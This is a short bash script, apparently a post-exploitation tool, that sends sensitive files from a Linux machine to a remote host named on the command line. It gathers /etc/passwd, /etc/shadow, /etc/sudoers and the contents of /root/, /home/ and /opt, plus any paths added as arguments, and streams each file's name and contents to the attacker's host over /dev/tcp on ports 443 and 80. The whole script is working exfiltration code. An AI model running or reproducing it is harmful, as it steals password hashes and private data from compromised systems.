#!/bin/bash

if [ -z $1 ]; then
	echo "ERROR: Usage ./$1 RHOST [FILES OR DIRECTORIES]"
	exit 1
fi

########################
# Predefined Variables #
########################

ip=$1
cport=443
dport=80
loot=("/etc/passwd" "/etc/sudoers" "/etc/shadow" "/root/" "/home/" "/opt")

loot+=(${@:2})

send() {
	echo "Sending the file... $1"
	echo "$1" > /dev/tcp/${ip}/${cport}
	sleep 0.5
	cat $1 > /dev/tcp/${ip}/${dport}	
}

# Loops through and transfers every loot file
for i in "${loot[@]}"; do
	if [[ -f "${i}" ]] ;
	then
		send $i
	elif [[ -d "${i}" ]] ;
	then
		echo "Sending the files in the directory $i" 
		for file in $i/* ; do
			if [[ -d "$file" ]] ; then
				echo "Not sending $file, it is a directory."
			else
				send $file
			fi
		done
	fi
done
